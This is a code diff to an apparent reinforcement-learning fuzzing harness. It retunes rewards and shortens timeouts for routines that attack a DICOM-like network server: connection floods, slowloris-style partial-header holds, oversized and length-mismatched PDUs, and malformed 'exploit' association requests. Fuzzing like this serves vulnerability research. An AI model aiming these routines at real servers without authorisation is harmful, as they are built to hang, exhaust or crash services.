@@ -449,7 +449,7 @@ class AggressiveFuzzEnv(gym.Env):
             if error == "timeout":
                 info["hang"] = True
                 self.hangs_detected += 1
-                reward += 50.0
+                reward += 20.0
             elif error == "refused":
                 if not self._check_server_alive():
                     info["crash"] = True
@@ -458,10 +458,10 @@ class AggressiveFuzzEnv(gym.Env):
             elif response:
                 if response[0] == 0x07:  # Abort
                     info["response"] = "abort"
-                    reward += 15.0
+                    reward += 50.0
                 elif response[0] == 0x02:  # Accept with payload!
                     info["response"] = "accept_payload"
-                    reward += 30.0  # Very interesting
+                    reward += 30.0
 
         return reward, info
 
@@ -480,11 +480,15 @@ class AggressiveFuzzEnv(gym.Env):
 
             if error == "timeout":
                 info["hang"] = True
-                reward += 50.0
+                reward += 20.0
             elif error:
                 reward += 5.0
-            elif response and response[0] != 0x03:  # Not normal reject
-                reward += 20.0
+            elif response:
+                if response[0] == 0x07:  # Abort
+                    info["response"] = "abort"
+                    reward += 50.0
+                elif response[0] != 0x03:  # Not normal reject
+                    reward += 20.0
 
         return reward, info
 
@@ -499,7 +503,7 @@ class AggressiveFuzzEnv(gym.Env):
         for payload in payloads:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(3.0)
+                sock.settimeout(2.0)
                 sock.connect((self.target_host, self.target_port))
 
                 # Send association
@@ -519,13 +523,13 @@ class AggressiveFuzzEnv(gym.Env):
 
                         if data_resp and data_resp[0] == 0x04:
                             info["response"] = "pdata_processed"
-                            reward += 25.0  # Server processed our malicious UID
+                            reward += 25.0
                         elif data_resp and data_resp[0] == 0x07:
                             info["response"] = "abort"
-                            reward += 10.0
+                            reward += 50.0
                     except socket.timeout:
                         info["hang"] = True
-                        reward += 50.0
+                        reward += 20.0
 
                 sock.close()
             except Exception as e:
@@ -552,7 +556,7 @@ class AggressiveFuzzEnv(gym.Env):
                 break
             elif error == "timeout":
                 info["hang"] = True
-                reward += 50.0
+                reward += 20.0
             elif error == "reset":
                 reward += 3.0
 
@@ -572,7 +576,7 @@ class AggressiveFuzzEnv(gym.Env):
                 reward += 100.0
             elif error == "timeout":
                 info["hang"] = True
-                reward += 40.0
+                reward += 20.0
             elif error == "reset":
                 reward += 2.0
 
@@ -585,7 +589,7 @@ class AggressiveFuzzEnv(gym.Env):
 
         if error == "timeout":
             info["hang"] = True
-            return 40.0, info
+            return 20.0, info
         elif error == "refused":
             if not self._check_server_alive():
                 info["crash"] = True
@@ -599,10 +603,10 @@ class AggressiveFuzzEnv(gym.Env):
 
         if error == "timeout":
             info["hang"] = True
-            return 50.0, info
+            return 20.0, info
         elif response and response[0] == 0x07:
             info["response"] = "abort"
-            return 15.0, info
+            return 50.0, info
         return 5.0, info
 
     def _attack_double_assoc(self, intensity, info):
@@ -612,7 +616,7 @@ class AggressiveFuzzEnv(gym.Env):
 
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(3.0)
+            sock.settimeout(2.0)
             sock.connect((self.target_host, self.target_port))
 
             # First association
@@ -629,10 +633,10 @@ class AggressiveFuzzEnv(gym.Env):
                         reward = 30.0  # Server accepted double association!
                     elif resp2 and resp2[0] == 0x07:
                         info["response"] = "abort"
-                        reward = 10.0
+                        reward = 50.0  # Abort: server hit error-handling path
                 except socket.timeout:
                     info["hang"] = True
-                    reward = 50.0
+                    reward = 20.0  # Hang: resource exhaustion potential
 
             sock.close()
         except Exception as e:
@@ -649,7 +653,7 @@ class AggressiveFuzzEnv(gym.Env):
 
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(3.0)
+            sock.settimeout(2.0)
             sock.connect((self.target_host, self.target_port))
 
             sock.sendall(assoc_rq)
@@ -666,7 +670,7 @@ class AggressiveFuzzEnv(gym.Env):
                     reward = 20.0  # Server responded after abort
             except socket.timeout:
                 info["hang"] = True
-                reward = 40.0
+                reward = 20.0  # Hang: resource exhaustion potential
 
             sock.close()
         except Exception as e:
@@ -685,10 +689,14 @@ class AggressiveFuzzEnv(gym.Env):
 
             if error == "timeout":
                 info["hang"] = True
-                reward += 30.0
+                reward += 20.0
             elif response:
-                info["response"] = f"type_{pdu_type:02x}_resp"
-                reward += 10.0
+                if response[0] == 0x07:
+                    info["response"] = "abort"
+                    reward += 50.0
+                else:
+                    info["response"] = f"type_{pdu_type:02x}_resp"
+                    reward += 10.0
 
         return reward, info
 
@@ -702,11 +710,11 @@ class AggressiveFuzzEnv(gym.Env):
         # Try multiple large PDUs in sequence
         for _ in range(intensity + 1):
             pdu = build_oversized_pdu(size)
-            response, time_ms, error = self._send_and_receive(pdu, timeout=8.0)
+            response, time_ms, error = self._send_and_receive(pdu, timeout=2.0)
 
             if error == "timeout":
                 info["hang"] = True
-                reward += 60.0
+                reward += 20.0
             elif error == "refused":
                 if not self._check_server_alive():
                     info["crash"] = True
@@ -738,7 +746,10 @@ class AggressiveFuzzEnv(gym.Env):
 
         if error == "timeout":
             info["hang"] = True
-            return 40.0, info
+            return 20.0, info
+        elif response and response[0] == 0x07:
+            info["response"] = "abort"
+            return 50.0, info
         return 3.0, info
 
     def _attack_concurrent_flood(self, intensity, info):
@@ -765,7 +776,7 @@ class AggressiveFuzzEnv(gym.Env):
 
         with ThreadPoolExecutor(max_workers=n_connections) as executor:
             futures = [executor.submit(connect_and_send) for _ in range(n_connections)]
-            for f in as_completed(futures, timeout=10):
+            for f in as_completed(futures, timeout=5):
                 try:
                     results.append(f.result())
                 except:
@@ -780,7 +791,7 @@ class AggressiveFuzzEnv(gym.Env):
             reward = 40.0
         if timeout_count > n_connections * 0.3:
             info["hang"] = True
-            reward += 30.0
+            reward += 20.0
 
         # Check if server is still alive
         if not self._check_server_alive():
@@ -796,13 +807,13 @@ class AggressiveFuzzEnv(gym.Env):
 
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(3.0)
+            sock.settimeout(2.0)
             sock.connect((self.target_host, self.target_port))
 
             # Send first half
             mid = len(assoc_rq) // 2
             sock.sendall(assoc_rq[:mid])
-            time.sleep(0.5)  # Delay between fragments
+            time.sleep(0.05)  # Brief delay between fragments
 
             # Send second half
             sock.sendall(assoc_rq[mid:])
@@ -814,7 +825,7 @@ class AggressiveFuzzEnv(gym.Env):
                     reward = 10.0
             except socket.timeout:
                 info["hang"] = True
-                reward = 30.0
+                reward = 20.0
 
             sock.close()
         except Exception as e:
@@ -854,7 +865,7 @@ class AggressiveFuzzEnv(gym.Env):
         for i in range(n_pdus):
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(5.0)
+                sock.settimeout(2.0)
                 sock.connect((self.target_host, self.target_port))
 
                 # Send large association request
@@ -866,9 +877,12 @@ class AggressiveFuzzEnv(gym.Env):
 
                 try:
                     resp = sock.recv(4096)
+                    if resp and resp[0] == 0x07:
+                        info["response"] = "abort"
+                        reward += 50.0
                 except socket.timeout:
                     info["hang"] = True
-                    reward += 40.0
+                    reward += 20.0
 
                 sock.close()
             except ConnectionRefusedError:
@@ -878,9 +892,6 @@ class AggressiveFuzzEnv(gym.Env):
                     break
             except Exception as e:
                 pass
-
-            # Brief pause to let server process
-            time.sleep(0.1)
 
         # Check if server is degraded
         if not self._check_server_alive():
@@ -901,20 +912,18 @@ class AggressiveFuzzEnv(gym.Env):
         for i in range(n_connections):
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(10.0)
+                sock.settimeout(2.0)
                 sock.connect((self.target_host, self.target_port))
                 sockets.append(sock)
             except:
                 pass
 
-        # Send data byte by byte with delays
-        for byte_idx in range(min(50, len(assoc_rq))):
-            for sock in sockets:
-                try:
-                    sock.send(assoc_rq[byte_idx:byte_idx+1])
-                except:
-                    pass
-            time.sleep(0.1)  # Slow send
+        # Send partial headers to hold connections (no per-byte delay)
+        for sock in sockets:
+            try:
+                sock.send(assoc_rq[:6])  # Just the PDU header, incomplete
+            except:
+                pass
 
         # Check if we've exhausted connections
         test_sock = None
@@ -926,10 +935,10 @@ class AggressiveFuzzEnv(gym.Env):
             reward = 10.0
         except socket.timeout:
             info["hang"] = True
-            reward = 50.0
+            reward = 20.0  # Hang: resource exhaustion potential
         except ConnectionRefusedError:
             info["response"] = "connection_exhausted"
-            reward = 40.0
+            reward = 30.0  # Exhausted connections - DoS signal
         except:
             pass
 
@@ -957,7 +966,7 @@ class AggressiveFuzzEnv(gym.Env):
         for claimed_len, actual_len in mismatches[:intensity + 2]:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(3.0)
+                sock.settimeout(2.0)
                 sock.connect((self.target_host, self.target_port))
 
                 # Build PDU with mismatched length
@@ -967,11 +976,15 @@ class AggressiveFuzzEnv(gym.Env):
                 try:
                     resp = sock.recv(4096)
                     if resp:
-                        info["response"] = f"mismatch_{claimed_len}_{actual_len}"
-                        reward += 10.0
+                        if resp[0] == 0x07:
+                            info["response"] = "abort"
+                            reward += 50.0
+                        else:
+                            info["response"] = f"mismatch_{claimed_len}_{actual_len}"
+                            reward += 10.0
                 except socket.timeout:
                     info["hang"] = True
-                    reward += 30.0
+                    reward += 20.0
 
                 sock.close()
             except ConnectionResetError:
@@ -1020,12 +1033,16 @@ class AggressiveFuzzEnv(gym.Env):
 
                     if error == "timeout":
                         info["hang"] = True
-                        reward += 40.0
+                        reward += 20.0
                     elif error == "refused" and not self._check_server_alive():
                         info["crash"] = True
                         reward += 100.0
                     elif response:
-                        reward += 5.0
+                        if response[0] == 0x07:
+                            info["response"] = "abort"
+                            reward += 50.0
+                        else:
+                            reward += 5.0
 
                 except Exception as e:
                     pass
@@ -1060,10 +1077,13 @@ class AggressiveFuzzEnv(gym.Env):
 
             if error == "timeout":
                 info["hang"] = True
-                reward += 30.0
+                reward += 20.0
             elif error == "refused" and not self._check_server_alive():
                 info["crash"] = True
                 reward += 100.0
+            elif response and response[0] == 0x07:
+                info["response"] = "abort"
+                reward += 50.0
 
             # In Application Context
             pdu = build_exploit_assoc_rq(
@@ -1074,7 +1094,10 @@ class AggressiveFuzzEnv(gym.Env):
 
             if error == "timeout":
                 info["hang"] = True
-                reward += 30.0
+                reward += 20.0
+            elif response and response[0] == 0x07:
+                info["response"] = "abort"
+                reward += 50.0
 
         return reward, info
 
@@ -1136,8 +1159,20 @@ class AggressiveFuzzEnv(gym.Env):
         strategy_name = ATTACK_STRATEGIES[strategy_idx][0]
         reward, info = self._execute_attack(strategy_name, intensity)
 
-        # Track responses
-        resp = info.get("response", "unknown")
+        # Normalise internal labels → standard taxonomy before exposing to metrics
+        resp = info.get("response", "none")
+        if resp in ("accept_payload", "double_accept"):
+            resp = "accept"
+        elif resp in ("pdata_processed",) or resp.startswith("fragment_0x04") or resp.startswith("post_abort_0x04"):
+            resp = "pdata"
+        elif resp.startswith("post_abort_") or resp.startswith("fragment_") or resp.startswith("mismatch_") or resp.startswith("type_"):
+            resp = "other"
+        elif resp == "connection_exhausted":
+            resp = "timeout"
+            info["hang"] = True
+        elif resp in ("none", "exception"):
+            resp = "unknown"
+        info["final_response"] = resp
         self.response_counts[resp] = self.response_counts.get(resp, 0) + 1
 
         if info.get("crash"):
